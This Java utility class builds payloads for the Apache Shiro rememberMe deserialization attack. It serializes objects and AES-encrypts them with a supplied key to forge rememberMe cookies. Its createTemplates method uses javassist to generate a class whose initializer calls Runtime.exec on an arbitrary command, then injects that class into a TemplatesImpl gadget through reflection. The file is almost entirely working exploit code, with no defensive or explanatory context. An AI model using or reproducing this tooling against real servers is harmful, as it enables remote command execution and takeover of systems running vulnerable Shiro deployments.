package core.util;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Random;

public class Util {
    public byte[] serialize(Object object) {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(bos)
        ) {
            oos.writeObject(object);
            return bos.toByteArray();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new byte[0];
    }

//    public String base64Encode(byte[] bytes) {
//        BASE64Encoder base64Encoder = new BASE64Encoder();
//        String payload = base64Encoder.encode(bytes);
//        return payload.replace("\n\n", "");
//    }

    public String getRememberMe(byte[] bytes, String key) {
        try {
            byte[] AES_KEY = new BASE64Decoder().decodeBuffer(key);
            AesCipherService aesCipherService = new AesCipherService();
            ByteSource source = aesCipherService.encrypt(bytes, AES_KEY);
            return source.toBase64().replace("\n\n", "");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    public void setFieldValue(Object obj, String field, Object value) {
        try {
            Class<?> clazz = Class.forName(obj.getClass().getName());
            Field field1 = clazz.getDeclaredField(field);
            field1.setAccessible(true);
            field1.set(obj, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public TemplatesImpl createTemplates(String command) {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("Foo" + new Random().nextInt(10));
        String commandTemplate = "java.lang.Runtime.getRuntime().exec(\"%s\");";
        byte[] bytes = new byte[1024];
        try {
            ctClass.makeClassInitializer().insertBefore(String.format(commandTemplate, command));
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            bytes = ctClass.toBytecode();
        } catch (Exception e) {
            e.printStackTrace();
        }
        TemplatesImpl templates = new TemplatesImpl();
        this.setFieldValue(templates, "_name", "foo");
        this.setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        this.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }
}
